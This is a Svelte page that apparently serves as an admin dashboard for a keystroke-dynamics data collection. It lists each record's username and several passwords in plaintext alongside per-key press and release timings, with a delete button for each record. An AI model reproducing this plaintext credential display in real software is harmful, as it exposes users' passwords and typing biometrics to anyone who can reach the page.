<script lang="ts">
	import { onMount } from "svelte";

	export let data;

	interface Entry {
		key: string;
		keyDownTime?: number;
		keyUpTime?: number;
		durationInSeconds?: number;
	}

	interface UserData {
		[type: string]: Entry[];
	}

	interface Record {
		id: string;
		keyData?: string;
		password?: string;
		password1?: string;
		password2?: string;
		username?: string;
	}

	let parsedData: Record[] = [];
	let parsedKeyData: UserData[] = [];
	let error: string | null = null;

	onMount(async () => {
		const result = data.database;
		if (result.data && typeof result.data === "object") {
			const records: Record[] = Object.entries(result.data).map(([id, value]) => (typeof value === 'object' ? { id, ...value } : { id }));
			records.forEach((record) => {
				if (record.keyData) {
					try {
						parsedKeyData.push(JSON.parse(record.keyData));
					} catch (e) {
						error = "Error parsing JSON data.";
					}
				} else {
					parsedKeyData.push({});
				}
			});
			parsedData = records;
		}
	});

	async function deleteRecord(id: string, index: number) {
		try {
			const response = await fetch("/api/delete", {
				method: "POST",
				headers: { "Content-Type": "application/json" },
				body: JSON.stringify({ id }),
			});

			if (response.ok) {
				parsedData = [...parsedData.slice(0, index), ...parsedData.slice(index + 1)];
				parsedKeyData = [...parsedKeyData.slice(0, index), ...parsedKeyData.slice(index + 1)];
			} else {
				const result = await response.json();
				error = result.error || "Failed to delete the record.";
			}
		} catch (err) {
			error = "An error occurred while trying to delete the record.";
		}
	}

</script>

<div class="container mt-4">
	<div class="d-flex align-items-center justify-content-between mb-4">
		<h1 class="mb-0">Database</h1>
	</div>
	{#if error}
		<div class="alert alert-danger">{error}</div>
	{:else if parsedData.length > 0}
		{#each parsedData as record, index}
			{#if parsedKeyData[index]}
				<div class="card mb-4">
					<div class="card-header d-flex justify-content-between align-items-center">
						<div>
							<strong>Username:</strong> {record.username} |
							<strong>Password:</strong> {record.password} |
							<strong>Password 1:</strong> {record.password1} |
							<strong>Password 2:</strong> {record.password2}
						</div>
						<div>
							<button
								class="btn btn-sm btn-secondary"
								type="button"
								data-bs-toggle="collapse"
								data-bs-target={`#collapse-${index}`}
								aria-expanded="false"
								aria-controls={`collapse-${index}`}>
								Show/Hide Data
							</button>
							<button
								class="btn btn-sm btn-danger ms-2"
								on:click={() => deleteRecord(record.id, index)}>
								Delete
							</button>
						</div>
					</div>
					<div id={`collapse-${index}`} class="collapse">
						<div class="card-body">
							<table class="table table-striped table-hover">
								<thead>
									<tr>
										<th>Type</th>
										<th>Key</th>
										<th>KeyDown Time</th>
										<th>KeyUp Time</th>
										<th>Duration (s)</th>
									</tr>
								</thead>
								<tbody>
									{#each Object.entries(parsedKeyData[index]) as [type, entries]}
										{#each entries as entry}
											<tr>
												<td>{type}</td>
												<td>{entry.key}</td>
												<td>{entry.keyDownTime ?? "N/A"}</td>
												<td>{entry.keyUpTime ?? "N/A"}</td>
												<td>{entry.durationInSeconds ?? "N/A"}</td>
											</tr>
										{/each}
									{/each}
								</tbody>
							</table>
						</div>
					</div>
				</div>
			{:else}
				<p>No key data for this record.</p>
			{/if}
		{/each}
	{:else}
		<p>Loading data...</p>
	{/if}
</div>
